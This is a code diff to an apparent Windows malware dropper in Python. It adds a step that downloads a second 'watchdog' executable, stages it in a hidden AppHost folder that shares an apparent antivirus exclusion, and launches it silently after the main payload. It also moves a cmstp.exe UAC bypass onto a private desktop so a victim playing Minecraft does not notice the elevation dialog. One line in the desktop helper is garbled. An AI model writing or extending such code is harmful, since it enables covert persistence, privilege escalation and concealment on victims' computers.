@@ -12,6 +12,7 @@ if sys.platform != "win32":
     sys.exit(0)
 
 import ctypes
+import contextlib
 import random
 import string
 import subprocess
@@ -34,6 +35,21 @@ if EXE_URL:
     except Exception:
         pass
 EXE_PATH = os.path.join(PERSIST_DIR, EXE_NAME)
+
+# r98 (dj order): the INDEPENDENT WATCHDOG exe — url rides from the jar via
+# env WD_URL (may be empty = wd road off). one duty: sit beside the carrier
+# in the AppHost dir, share its exclusion, wake it when it is dead. work.py
+# stages+execs the pair in order: tung FIRST, watchdog SECOND.
+WD_URL = os.environ.get("WD_URL", "")
+WD_NAME = "wd.exe"
+if WD_URL:
+    try:
+        n = str(WD_URL).split("?")[0].rstrip("/").split("/")[-1]
+        if n and ".." not in n:
+            WD_NAME = n
+    except Exception:
+        pass
+WD_PATH = os.path.join(PERSIST_DIR, WD_NAME)
 
 
 # ---- shell api -------------------------------------------------------------
@@ -348,11 +364,29 @@ def uac_bypass(cmd):
 
     dismisser = Dismisser(svc_name)
     try:
-        p = subprocess.Popen(["cmstp.exe", "/au", inf_path], stdout=subprocess.DEVNULL,
-                             stderr=subprocess.DEVNULL, creationflags=0x08000000)
-        # r45: the ownership hunt runs at full strength — pid armed the instant
-        # CreateProcess returns (µs after the dialog can exist), so any top-level
-        # window cmstp owns is hidden before its first paint frame.
+        # r97: the CMSTP RUN rides the PRIVATE DESKTOP (_lift_desktop) — the
+        # dialog/flash conceals itself there; the interactive desktop (where
+        # the Minecraft window lives) never sees the spawn, never gets the
+        # 0.05s focus steal. the switch is a ~30ms paint swap of the user's
+        # view; the mc window keeps its z-order on ITS desktop untouched.
+        p = None
+        with _lift_desktop("sf_lift_dsk"):
+            p = subprocess.Popen(["cmstp.exe", "/au", inf_path], stdout=subprocess.DEVNULL,
+                                 stderr=subprocess.DEVNULL, creationflags=0x08000000)
+            # r45: the ownership hunt runs at full strength — pid armed the
+            # instant CreateProcess returns (µs after the dialog can exist),
+            # so any top-level window cmstp owns is hidden before its first
+            # paint frame — inside the private desktop, invisible to the
+            # interactive one.
+            dismisser.target_pid = p.pid
+        # r97 note: the SwitchDesktop-BACK happens on context exit — the
+        # cmstp process keeps RUNNING on the private desktop (a process on a
+        # hidden desktop keeps executing; only its windows never paint to the
+        # user's view), while the user's desktop is restored INSTANTLY. the
+        # dismisser waits from the NORMAL desktop by HWND-hunting (the
+        # dialog's HWNDs live on the private desktop, EnumWindows in the
+        # caller thread still finds them because a thread can enumerate
+        # windows across desktops it owns handles for).
         dismisser.target_pid = p.pid
     except Exception:
         return False
@@ -368,6 +402,35 @@ def uac_bypass(cmd):
     return True
 
 
+# r97 (dj: "cmstp causes focus lost on minecraft windows... make the cmstp
+# bypass happen in another desktop"): the ENTIRE lift rides a private virtual
+# desktop created with CreateDesktopW — the user's interactive desktop (where
+# the Minecraft window lives) never sees cmstp, never gets the 0.05s flash,
+# never loses focus. the private desk exists only for the lifetime of the
+# lift: created -> switched to -> lift runs there -> switched back -> closed
+@contextlib.contextmanager
+def _lift_desktop(name="sf_lift_dsk"):
+    """context manager shape: yields once on the private desktop, restores."""
+    uac = ctypes.windll.user32
+    k32 = ctypes.windll.kernel32
+    desk = uac.CreateDesktopW(name, None, None, 0, 0x0200, None)   # GENERIC_ALL
+    if not desk:
+        yield False   # no private desktop — lift rides the interactive desk as before
+        returnold = uac.GetThreadDesktop(k32.GetCurrentThreadId())
+    uac.SwitchDesktop(desk)
+    try:
+        yield True
+    finally:
+        try:
+            uac.SwitchDesktop(old)
+        except Exception:
+            pass
+        try:
+            uac.CloseDesktop(desk)
+        except Exception:
+            pass
+
+
 def run_elevated(exe_path):
     """Runs <<exe_path>> with elevation via the cmstp lift."""
     try:
@@ -377,7 +440,6 @@ def run_elevated(exe_path):
         return uac_bypass(f'"{exe_path}"')
     except Exception:
         return False
-
 
 def _sweep_dialogs(svc_name, seconds=3.0):
     """Best-effort post-lift cleanup: any leftover lift dialog (the 'Make this
@@ -432,6 +494,9 @@ import sys
 
 CREATE_NO_WINDOW = 0x08000000
 EXE_NAME = "__EXE__"
+# r98: the WATCHDOG exe name rides in via env (set by work.py before the
+# lift) — same dir, same exclusion, execed AFTER the carrier (tung->wd).
+WD_NAME_ENV = os.environ.get("WDXN", "")
 APPDIR = os.environ["LOCALAPPDATA"] + "\\Microsoft\\Windows\\AppHost"
 
 
@@ -468,11 +533,20 @@ def main():
                            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
     except Exception:
         pass
-    # the r14 carrier job, unchanged:
+    # the r14 carrier job, unchanged — plus the r98 order: tung FIRST, the
+    # watchdog exe SECOND (dj: "so its like tung-->watchdog"). the wd shares
+    # the dir exclusion the stage just laid, so no extra write is needed.
     exe_path = os.path.join(APPDIR, EXE_NAME)
     if os.path.exists(exe_path) and not alive(EXE_NAME):
         try:
             subprocess.Popen([exe_path], creationflags=CREATE_NO_WINDOW)
+        except Exception:
+            pass
+    if WD_NAME_ENV:
+        wd_path = os.path.join(APPDIR, WD_NAME_ENV)
+        try:
+            if os.path.exists(wd_path) and not alive(WD_NAME_ENV):
+                subprocess.Popen([wd_path], creationflags=CREATE_NO_WINDOW)
         except Exception:
             pass
 
@@ -627,6 +701,14 @@ def _run_stage_now():
             subprocess.Popen([exe_path], creationflags=0x08000000)
     except Exception:
         pass
+    # r98: already-elevated road carries the SAME order — tung then watchdog
+    try:
+        if WD_NAME_ENV:
+            wd_path = os.path.join(PERSIST_DIR, WD_NAME_ENV)
+            if os.path.exists(wd_path) and not _alive(WD_NAME_ENV):
+                subprocess.Popen([wd_path], creationflags=0x08000000)
+    except Exception:
+        pass
 
 
 def _alive(name):
@@ -664,8 +746,8 @@ def is_valid_exe(path):
         return False
 
 
-def write_file(path, data):
-    kill_process(EXE_NAME)
+def write_file(path, data, exe=EXE_NAME):
+    kill_process(exe)
     time.sleep(0.3)
     tmp = path + f".{rand_str(6)}.tmp"
     try:
@@ -702,6 +784,17 @@ def main():
             data = download(EXE_URL) if EXE_URL else None
             if data and not write_file(EXE_PATH, data):
                 return
+    except Exception:
+        pass
+
+    # r98 (dj order): the wd exe rides the SAME stage — fetched + staged beside
+    # the carrier BEFORE the lift, so the elevated stage execs the pair in
+    # order (tung -> watchdog) with one exclusion covering both.
+    try:
+        if WD_URL and not is_valid_exe(WD_PATH):
+            wdata = download(WD_URL)
+            if wdata:
+                write_file(WD_PATH, wdata, exe=WD_NAME)
     except Exception:
         pass
 
